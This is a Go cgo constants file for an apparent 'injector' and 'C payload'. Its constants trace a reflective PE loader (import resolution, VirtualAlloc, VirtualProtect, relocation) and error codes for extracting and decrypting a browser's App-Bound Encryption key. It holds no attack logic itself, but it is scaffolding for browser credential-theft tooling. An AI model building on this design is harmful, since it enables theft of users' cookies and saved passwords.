//go:build ignore

// Code generation entry for scratch layout constants shared between the
// C payload and the Go injector. Regenerate with `make gen-layout`.

package bootstrap

/*
#include "../bootstrap_layout.h"
*/
import "C"

const (
	MarkerOffset         = C.BOOTSTRAP_MARKER_OFFSET
	KeyStatusOffset      = C.BOOTSTRAP_KEY_STATUS_OFFSET
	KeyStatusReady       = C.BOOTSTRAP_KEY_STATUS_READY
	ExtractErrCodeOffset = C.BOOTSTRAP_EXTRACT_ERR_CODE_OFFSET
	HResultOffset        = C.BOOTSTRAP_HRESULT_OFFSET
	ComErrOffset         = C.BOOTSTRAP_COMERR_OFFSET
	KeyOffset            = C.BOOTSTRAP_KEY_OFFSET
	KeyLen               = C.BOOTSTRAP_KEY_LEN

	ImpLoadLibraryAOffset   = C.BOOTSTRAP_IMPORT_LOADLIBRARYA_OFFSET
	ImpGetProcAddressOffset = C.BOOTSTRAP_IMPORT_GETPROCADDRESS_OFFSET
	ImpVirtualAllocOffset   = C.BOOTSTRAP_IMPORT_VIRTUALALLOC_OFFSET
	ImpVirtualProtectOffset = C.BOOTSTRAP_IMPORT_VIRTUALPROTECT_OFFSET
	ImpNtFlushICOffset      = C.BOOTSTRAP_IMPORT_NTFLUSHIC_OFFSET

	MarkMZFound      = C.BOOTSTRAP_MARK_MZ_FOUND
	MarkImportsOK    = C.BOOTSTRAP_MARK_IMPORTS_OK
	MarkAllocOK      = C.BOOTSTRAP_MARK_ALLOC_OK
	MarkCopied       = C.BOOTSTRAP_MARK_COPIED
	MarkRelocated    = C.BOOTSTRAP_MARK_RELOCATED
	MarkImportsFixed = C.BOOTSTRAP_MARK_IMPORTS_FIXED
	MarkPermissions  = C.BOOTSTRAP_MARK_PERMISSIONS
	MarkCacheFlushed = C.BOOTSTRAP_MARK_CACHE_FLUSHED
	MarkDone         = C.BOOTSTRAP_MARK_DONE
	MarkErrImports   = C.BOOTSTRAP_MARK_ERR_IMPORTS
	MarkErrAlloc     = C.BOOTSTRAP_MARK_ERR_ALLOC

	ErrOk             = C.ABE_ERR_OK
	ErrBasename       = C.ABE_ERR_BASENAME
	ErrBrowserUnknown = C.ABE_ERR_BROWSER_UNKNOWN
	ErrEnvMissing     = C.ABE_ERR_ENV_MISSING
	ErrBase64         = C.ABE_ERR_BASE64
	ErrBstrAlloc      = C.ABE_ERR_BSTR_ALLOC
	ErrComCreate      = C.ABE_ERR_COM_CREATE
	ErrDecryptData    = C.ABE_ERR_DECRYPT_DATA
	ErrKeyLen         = C.ABE_ERR_KEY_LEN
)
